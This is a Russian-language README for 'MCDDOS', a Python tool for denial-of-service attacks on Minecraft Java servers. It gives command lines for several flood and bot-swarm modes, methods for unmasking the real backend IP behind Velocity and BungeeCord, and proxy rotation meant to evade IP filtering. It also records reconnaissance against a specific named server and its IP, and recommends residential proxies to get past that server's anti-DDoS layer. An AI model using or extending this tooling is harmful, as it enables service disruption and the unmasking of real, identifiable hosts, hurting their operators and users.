# MCDDOS — проект «Minecraft Java DDoS + авто-детект»

Дата сборки: 25.09.2025 · Python 3 (asyncio, без внешних Python-зависимостей)

---

## 1. Что это за проект

**MCDDOS** — асинхронный Python-инструмент для:
1. **Нагрузки/атаки** Minecraft Java-серверов (версии **1.16 → 26.3**, protocol **735–777**):
   режимы `ping`, `tcp`, `login`, `bot`, `mixed`.
2. **Авто-детекта** (скрипт `detect.py`): сам находит **версию сервера**,
   **реальный IP бэкенда** (за Velocity/BungeeCord) и **требование капчи/регистрации**.
3. **Обхода Velocity/BungeeCord** — парсинг prelogin plugin-сообщений,
   поиск backend IP/порта.
4. **Работы через прокси** — `http/https`, `socks4/4a`, `socks5/5h`,
   авто-загрузка публичных списков + верификация.

Полный протокол реализован «вручную» (varint, frame reader, configuration state,
signed chat 1.19.3+, bundle 1.20.2+, compression) — сверен с minecraft-data
и живыми серверами.

---

## 2. Структура архива

```
mcddos/                  ← основной пакет (устанавливается: pip install .)
  __init__.py            # версии пакета
  __main__.py            # python -m mcddos
  protocol.py            # Reader, varint/varlong/i64/i32, str_field, encode_field,
                         # handshake/status payload, parse_status
  fields.py              # чтение полей по type-таблицам (NBT, buffer, option, ...)
  versions.py            # имя версии -> protocol (1.16..26.3), guess_version_for_protocol
  ed25519.py             # Ed25519 чистым Python (подписанный чат)
  mcconn.py              # ★ MCConn: handshake->status->login->configuration->play,
                         #   бандлы, compression, прокси, prelogin (bungee/velocity)
  bots.py                # Bot / BotPool: keepalive (i64), signed chat, reconnect, прокси
  ddos.py                # потоки ping/tcp/login/mixed + статистика
  realip.py              # prelogin probe, parse_bungee/velocity, find_real_ip, subnet-скан
  proxies.py             # parse_proxy_line, fetch_proxies (11 источников), верификация
  cli.py                 # argparse CLI → консольная команда `mcddos`
  data/packets.json      # ★ ID пакетов по protocol-версии (735..777, 28 версий)

tools/detect.py          # ★ авто-детект: версия + реальный IP + капча (см. раздел 4)

pyproject.toml           # сборка: pip install . → команда mcddos
README.md                # краткая справка по пакету mcddos (CLI, API)

tests/                   # локальные тесты (нужен node + minecraft-protocol)
  tsrv.js                # тестовый MC-сервер (offline mode)
  cproxy3.py             # локальный HTTP CONNECT-прокси (порт 3129)
  smoke_status.py, smoke_login.py, smoke_bots.py, smoke_keepalive.py,
  chat_test.py, proxytest.py

tools/                   # вспомогательные скрипты
  extract_packets.py, extract_packets2.py   # извлечение packets.json из minecraft-data
  check_proxies.py                   # проверка живости прокси + гео egress-IP
  cl_diag.py, cl_rawdump.py, cl_deep.py, cl_bare.py, cl_single.py, cl_status.py,
  cl_status2.py, cl_multi.py, cl_query.py, cl_proxtest.py   # диагностика CoreLand
  coreland_probe.py, coreland_try.py, coreland_raw.py       # ранние пробы CoreLand
  zraw.py, zraw2.py, zetrex.py, zetrex2.py, rawlogin*.py, rawdump*.py  # пробы Zetrex
  fullscan.py, fullscan2.py, fullscan3.py, bigscan.py, live_scan.py,
  offline_scan.py, more_servers.py, proxytest.py           # сканеры офлайн-серверов
  lproxy.js, nodecap.js                  # node-снифферы (hex-дамп трафика)

data/                    # результаты диагностики
  alive_proxies.json     # 129 живых прокси с egress-гео (25.09)
  prio_proxies.txt       # список прокси (RU вперёд) для tools/detect.py
  detect_test_direct.log, detect_full.log, detect_prio.log  # логи прогонов detect.py
```

---

## 3. Установка и запуск основного инструмента

```bash
# 1) установка (зависимостей нет, только python ≥ 3.8)
pip install .
# или без установки:
python3 -m mcddos ...

# 2) команды
mcddos status play.example.com 25565        # версия/MOTD/игроки
mcddos versions                             # таблица версий
mcddos ping  play.example.com 25565 -w 50 -t 60
mcddos tcp   play.example.com 25565 -w 100 -t 60
mcddos login play.example.com 25565 -v 1.20.4 -w 20 -t 60
mcddos bot   play.example.com 25565 -v 1.20.4 -n 30 --chat-every 5 -t 120
mcddos mixed play.example.com 25565 -v 1.20.4 -w 30 -n 10 -t 120
mcddos realip play.example.com 25565        # реальный IP (prelogin + subnet-скан)
mcddos proxies play.example.com 25565 --fetch-proxies
```

Ключевые флаги: `-v/--version` (имя или protocol), `-w/--workers`, `-n/--bott`,
`-t/--time`, `--proxy` (URL или файл), `--fetch-proxies`, `--json`, `--online`.

---

## 4. detect.py — авто-детект (главный сценарий)

Задача: по host:port сам узнать **версию**, **реальный IP** и **капчу/регистрацию**.

```bash
# базовый запуск
python3 tools/detect.py CoreLand.go-srv.top 25565

# через прокси (главный способ обойти IP-фильтры)
python3 tools/detect.py HOST 25565 --proxy http://ip:port --proxy socks5://ip:port:user:pass
python3 tools/detect.py HOST 25565 --proxy-file data/prio_proxies.txt
python3 tools/detect.py HOST 25565 --fetch 800          # скачать 800 бесплатных
python3 tools/detect.py HOST 25565 --fetch 800 --timeout 4 --workers 40 --max-login-proxies 300
```

Алгоритм (4 фазы):
1. **DNS/TCP** — резолв, проверка порта.
2. **Status sweep** — параллельно для каждого источника (direct + все прокси)
   пробует status по «вероятным» протоколам (775→735). Первый ответ →
   версия/protocol/MOTD/игроки. Затем подтверждение точным protocol.
3. **Login через работающий источник** — полный offline-login; по
   `plugin_request` ловит `bungeecord:pre_login` (ip:port) или
   `velocity:pre_login` (JSON) → **реальный IP бэкенда**.
4. **Капча/регистрация** — классификация текста кика (captcha / registration /
   wrong_version / whitelist / full / ban / online_mode). Если кик не получен,
   короткий login sweep по прокси для поимки любого сигнала.

Результат — JSON в конце лога + человекочитаемая сводка.

### Что уже известно по CoreLand.go-srv.top (результат прогонов, 25.09)
- DNS → **193.37.71.193** (VPS nuxt.cloud, хостинг PG19/go-srv.top, RU-Москва).
- Игрок играет на **26.1.2 → protocol 775**.
- L4 anti-DDoS прокси **буферизует datacenter-IP**: direct (HOSTKEY Paris) и
  800+ бесплатных прокси — 0 байт (7209 status-проб, 387 login-проб).
- **Вывод**: нужен **резидентный (бытовой) прокси** — тогда `tools/detect.py
  --proxy http://...` раскроет версию, реальный IP (prelogin) и текст капчи.

---

## 5. Протокольные нюансы (уже учтено)

- ID пакетов: `mcddos/data/packets.json` (авторитетный mapper `packet`→`name`
  из minecraft-data; сверено с живыми серверами).
- `keep_alive` = **i64** во всех версиях; `ping/pong` = i32.
- `login_acknowledged` ≥764; `configuration` state ≥764 (settings→finish);
  keep_alive в config = переход в play.
- Signed chat ≥1.19.3 (Ed25519): timestamp/salt/signature, ≥1.20.3 +
  offset/acknowledged — всё по версии.
- Bundle (1.20.2+) id=0; compression — varint-unescape.
- Прокси: HTTP CONNECT + SOCKS4/5/5h; DNS через `socks5h`.

## 6. Локальные тесты (нужен node + `npm i minecraft-protocol`)

```bash
node tsrv.js &                 # тестовый offline-сервер (порт 25570)
python3 cproxy3.py &           # CONNECT-прокси на 3129
python3 tests/smoke_login.py   # login→play 1.16.5/1.19.2/1.20.4/1.21.1
python3 tests/chat_test.py     # signed chat x3 без кика
python3 tests/smoke_keepalive.py  # боты 18s, 0 киков
python3 tests/proxytest.py     # status+login через HTTP-прокси
```
